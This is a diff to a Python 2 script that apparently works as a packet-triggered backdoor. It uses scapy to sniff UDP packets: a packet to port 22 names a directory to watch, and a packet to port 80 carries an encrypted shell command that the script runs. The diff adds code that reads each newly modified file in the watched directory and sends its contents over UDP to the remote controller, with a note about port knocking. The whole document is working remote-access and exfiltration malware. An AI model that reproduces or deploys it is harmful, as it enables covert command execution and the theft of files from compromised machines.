@@ -42,18 +42,33 @@ def get_filename(path):
 
 wm = pyinotify.WatchManager()
 mask = pyinotify.IN_CLOSE_WRITE
-# wdd = wm.add_watch('/tmp', mask, rec=True)
 
-# Event Handler. We will fill it later
 class EventHandler(pyinotify.ProcessEvent):
 
+    def __init__(self, receivedPacket):
+        self.pkt = receivedPacket
+
     def process_IN_CLOSE_WRITE(self, event):
-        filename = get_filename(event.pathname)
+        filepath = event.pathname
+        filename = event.name
+        # filename = get_filename(filepath)
         print "file", filename, "modified"
 
-def watch_file(directory):
+        # port knock to client
 
-    handler = EventHandler()
+        # open a file and sent it to client
+        with open(filepath, 'r') as f:
+            data = f.read()
+        if data != None:
+            send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000, sport=7070)/(" " + data))
+    #
+    # def send_file(self, message):
+    #     print self.pkt["IP"].dst
+    #     send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000)/message)
+
+def watch_file(directory, receivedPacket):
+
+    handler = EventHandler(receivedPacket)
     notifier = pyinotify.Notifier(wm, handler)
     wdd = wm.add_watch(directory, mask, rec=True)
     notifier.loop()
@@ -73,17 +88,19 @@ def watch_file(directory):
 ##################################################################################
 def parsePacket(receivedPacket):
 
-    command = (receivedPacket['Raw'].load)
+    if receivedPacket['UDP'].dport == 22:
 
+        command = (receivedPacket['Raw'].load)
 
-    if receivedPacket["UDP"].dport == 22:
         directory = (receivedPacket['Raw'].load)
         print "Watching: ", directory
-        t = threading.Thread(name="watchfile_threading", target=watch_file, args=[directory])
+        t = threading.Thread(name="watchfile_threading", target=watch_file, args=[directory, receivedPacket])
         t.start()
 
 
     elif receivedPacket["UDP"].dport == 80:
+
+        command = decrypt(receivedPacket['Raw'].load)
 
         print "Excuting: " + command
         output = executeShellCommand(command)
